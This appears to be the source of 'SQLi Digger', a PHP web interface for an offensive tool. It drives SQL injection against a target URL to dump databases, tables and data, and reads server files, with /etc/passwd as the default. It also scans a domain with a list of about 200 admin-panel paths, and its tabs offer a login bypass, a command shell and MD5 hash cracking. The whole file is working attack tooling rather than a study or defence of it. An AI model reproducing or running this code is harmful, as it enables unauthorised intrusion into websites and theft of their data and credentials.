<?php
error_reporting(E_ALL ^ E_NOTICE);
include_once('SqlDigger.class.php');

$global=array();

function curl2($site,$headers=false)
{
	global $global;
	$ch = curl_init($site);
	$header = array();
	$header[0]  = "Accept: text/xml,application/xml,application/xhtml+xml,";
	$header[0] .= "text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5";
	$header[]   = "Cache-Control: max-age=0";
	$header[]   = "Connection: keep-alive";
	$header[]   = "Keep-Alive: 300";
	$header[]   = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
	$header[]   = "Accept-Language: en-us,en;q=0.5";
	$header[]   = "Pragma: "; // 1135browsers keep this blank.

	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,$url);

	curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1.7) Gecko/20070914 Firefox/2.0.0.7');
	curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
	//curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_URL, $site);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	
	//proxy = '127.0.0.1:8888';
	//proxyauth = 'user:password';
	if($global['proxy'])
	{
		curl_setopt($ch, CURLOPT_PROXY, $global['proxy']);
		
		if($global['proxyauth']){
			curl_setopt($ch, CURLOPT_PROXYUSERPWD, $global['proxyauth']);
		}
	}
	
	$c=curl_exec($ch);
	if($headers){
		return array('header'=>curl_getinfo($ch, CURLINFO_HTTP_CODE),'content'=>$c);
	}else{
		return $c;
	}
}
function prepare($array)
{
	global $injection;
	return json_encode(array('result'=>$array,'injection'=>$injection->_INJECTION));
}

if( $_REQUEST['findpanel']!='')
{
	$domain=$_REQUEST['findpanel'];
	$success=explode(',',$_REQUEST['success']);
	$found=array();	
	$errorPages=array();
	$urls=array('phpmyadmin/','myadmin/','cpanel/','admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/',
    'usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/',
    'panel-administracion/','instadmin/','memberadmin/','administratorlogin/','adm/','admin/account.php',
    'admin/index.php','admin/login.php','admin/admin.php','admin/account.php','admin_area/admin.php',
    'admin_area/login.php','siteadmin/login.php','siteadmin/index.php','siteadmin/login.html','admin/account.html',
    'admin/index.html','admin/login.html','admin/admin.html','admin_area/index.php','bb-admin/index.php','bb-admin/login.php',
    'bb-admin/admin.php','admin/home.php','admin_area/login.html','admin_area/index.html','admin/controlpanel.php','admin.php',
    'admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
    'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html',
    'panel-administracion/login.html','admin/cp.php','cp.php','administrator/index.php','administrator/login.php',
    'nsw/admin/login.php','webadmin/login.php','admin/admin_login.php','admin_login.php','administrator/account.php',
    'administrator.php','admin_area/admin.html','pages/admin/admin-login.php','admin/admin-login.php','admin-login.php',
    'bb-admin/index.html','bb-admin/login.html','acceso.php','bb-admin/admin.html','admin/home.html',
    'login.php','modelsearch/login.php','moderator.php','moderator/login.php','moderator/admin.php','account.php',
    'pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.php','admincontrol.php',
    'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.php',
    'adminarea/index.html','adminarea/admin.html','webadmin.php','webadmin/index.php','webadmin/admin.php',
    'admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.php','moderator.html',
    'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html',
    'login.html','modelsearch/login.html','moderator/login.html','adminarea/login.html','panel-administracion/index.html',
    'panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html','admincontrol/login.html',
    'adm/index.html','adm.html','moderator/admin.html','user.php','account.html','controlpanel.html','admincontrol.html',
    'panel-administracion/login.php','wp-login.php','adminLogin.php','admin/adminLogin.php','home.php','admin.php',
    'adminarea/index.php','adminarea/admin.php','adminarea/login.php','panel-administracion/index.php',
    'panel-administracion/admin.php','modelsearch/index.php','modelsearch/admin.php','admincontrol/login.php',
    'adm/admloginuser.php','admloginuser.php','admin2.php','admin2/login.php','admin2/index.php','usuarios/login.php',
    'adm/index.php','adm.php','affiliate.php','adm_auth.php','memberadmin.php','administratorlogin.php','admin.asp','admin/admin.asp',
    'admin_area/admin.asp','admin_area/login.asp','admin_area/index.asp','bb-admin/index.asp','bb-admin/login.asp',
    'bb-admin/admin.asp','pages/admin/admin-login.asp','admin/admin-login.asp','admin-login.asp','user.asp','webadmin/index.asp',
    'webadmin/admin.asp','webadmin/login.asp','admin/admin_login.asp','admin_login.asp','panel-administracion/login.asp',
    'adminLogin.asp','admin/adminLogin.asp','home.asp','adminarea/index.asp','adminarea/admin.asp','adminarea/login.asp',
    'panel-administracion/index.asp','panel-administracion/admin.asp','modelsearch/index.asp','modelsearch/admin.asp',
    'admincontrol/login.asp','adm/admloginuser.asp','admloginuser.asp','admin2/login.asp','admin2/index.asp','adm/index.asp',
    'adm.asp','affiliate.asp','adm_auth.asp','memberadmin.asp','administratorlogin.asp','siteadmin/login.asp','siteadmin/index.asp');

	if(sizeof($success)<1){
		die('[]');//you idiot?
	}
	//wrong petitions to filter errors
	$errorPages['file']=curl2($domain.'/3g5353534g53g334g34.htm');		
	$errorPages['folder']=curl2($domain.'/3g5353534g53g334g34/');
	
	foreach($urls as $url)
	{
		$res=curl2($domain.'/'.$url,true);
		if(in_array($res['header'],$success) && $res['content']!='' && $res['content']!=$errorPages['file'] && $res['content']!=$errorPages['folder']){
			$found[]=array(
				'header'=>$res['header'],
				'page'=>$domain.'/'.$url,
				);
		}
	}
	die(json_encode($found));		
}
elseif(isset($_REQUEST['injection']) || $_REQUEST['injection']!='')
{
	$petition=$_REQUEST['petition'];
	
	$injection=new SqlDigger($_REQUEST['injection']);

	foreach($petition['array'] as $k=>$q)
	{
		$r=$injection->show($petition['what'],$q);
	}
	
	if($petition['what']!='file' && $petition['what']!='data'){
		$r=array();
	}
	die(prepare($r));
}elseif(isset($_REQUEST['url']) || $_REQUEST['url']!=''){

	$injection=new SqlDigger(array('url'=>$_REQUEST['url']));
	$injection->debug=false;
	$injection->init();
	$injection->getRows();
	$r=$injection->show('databases');

	echo prepare($r);

	die();
}
?>
<html>
<head>
	<title>SQLi Digger - 1135</title>
	<link rel="stylesheet" type="text/css" href="css/sql.css" />	
	<script type="text/javascript" src="js/sql.js"></script>
</head>
<body>
	<center>
		<div style="margin-bottom: 20px">
			<h1>SQLi Digger</h1>
			<input style="width:500px;" name="url" id="url" placeholder="http://site.com/?id=2" type="text"><button onclick="check();">Check</button>
			<br><label>POST (optional):<input style="width:400px;" name="post" type="text"></label><br>
			<label>login bypass?<select name="islogin" id="islogin"><option value="">no</option><option value="1">yes</option></select></label>
		</div>
	</center>
	<div id="tabOptions">
		<span class="pointer selected" load="tablesTab"><div class="digger tables"></div>Tables</span>
		<span class="pointer" load="fileTab"><div class="digger file"></div>Read files</span>
		<span class="pointer" ><div class="digger cmd"></div>cmd Shell</span>
		<span class="pointer"><div class="digger query"></div>Query</span>
		<span class="pointer" load="adminTab"><div class="digger admin"></div>Find Admin</span>
		<span class="pointer" load="md5Tab"><div class="digger md5"></div>MD5</span>
		<span class="pointer"><div class="digger settings"></div>Settings</span>
	</div>
	<div id="result">
		<div id="fileTab" class="tab oculto">
			<label>File address: <input id="fileDir"type="text" value="/etc/passwd"></label><button onclick="showFile();">Read</button><br>
			<textarea id="fileResult">				
			</textarea>	
		</div>
		<div id="md5Tab" class="tab oculto">
			<label>MD5 Hash: <input id="hash"type="text"></label><button onclick="findHash();">Start</button>
			<div id="md5Results">
				<table cellpadding="3" border="1">
					<tbody>
						<tr>
							<th>Site</th>
							<th>Pass</th>
						</tr>
					</tbody>
				</table>
			</div>	
		</div>
		<div id="adminTab" class="tab oculto">
			<div>
				<label style="display:inline;">Path to search: <input id="adminUrl"type="text"></label><button onclick="findPanel();">Start</button>
				<label>Success res: <input id="successRes"type="text" value="200,500,301,302,403"/></label>
			</div>
			<div id="adminResults">
				<table cellpadding="3" border="1">
					<tbody>
						<tr>
							<th>Page</th>
							<th>Response</th>
						</tr>
					</tbody>
				</table>
			</div>				
		</div>
		<div id="tablesTab" class="tab">
			<div id="middleOptions">
				<button id="showTables" disabled="disabled"><div class="digger table"></div>Get Tables</button>
				<button id="showColumns" disabled="disabled"><div class="digger column"></div>Get Columns</button>
				<button id="showData" disabled="disabled"><div class="digger data"></div>Get Data</button>
				<button id="saveData" disabled="disabled"><div class="digger save"></div>Save Data</button>
			</div>
			<div id="middle">
				<ul id="databaseTree" class="treeview">			
				</ul>
				<div id="columns">
				</div>
			</div>
		</div>
			<div id="statusBar">
				<img id="loadingIcon"style="display:none;"src="images/loading_icon.gif"/>
				<span>Status:</span> <span id="status" class="blue">I'm IDLE</span>
				<span style="float:right" onclick="clearLog();" class="blue pointer">Clear log</span>
			</div>
			<div id="console">
			</div>
		
	</div>
	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>	
	<script type="text/javascript" src="js/jstree.js"></script>
		<script type="text/javascript">
		$(document)
			.on('click','#middleOptions #showTables',function(){			
				show('tables');
			})
			.on('click','#middleOptions #showColumns',function(){			
				show('columns');
			})
			.on('click','#middleOptions #showData',function(){			
				show('data');
			})
			.on('click','#middleOptions #saveData',function(){			
				saveDump();
			})
			.on('click','#tabOptions span',function(){			
				var tab=$(this).attr('load'),
					itsTab={};
				if(tab==null){return false;}
				
				$('#tabOptions span').each(function()
				{
					itsTab=$(this).attr('load');
					if(tab!=null){$('#'+itsTab).hide();}
					$(this).removeClass('selected');
				});
				$(this).addClass('selected');
				$('#'+tab).show();
			})
			;

		firstTime=true;
		injection={};		
	</script>
</body>
</html>
